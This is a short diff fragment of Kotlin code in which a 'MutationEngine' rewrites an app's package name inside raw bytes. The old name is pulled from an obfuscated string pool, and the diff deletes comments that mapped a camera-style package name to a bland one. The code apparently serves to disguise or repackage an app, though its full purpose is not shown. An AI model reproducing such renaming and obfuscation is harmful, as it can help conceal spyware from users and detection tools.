@@ -214,8 +214,6 @@ class MutationEngine(private val context: Context) {
     private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
         val oldPkg = StringPool.d(StringPool.COMPANION_OLD_PKG)
 
-        // Patch dot-format: com.android.photo.camera.capture → com.backgroundboots.synchandlers
-        // Patch slash-format: com/android/photo/camera/capture → com/backgroundboots/synchandlers
         val targets = listOf(
             oldPkg                    to newPkg,
             oldPkg.replace('.', '/') to newPkg.replace('.', '/')
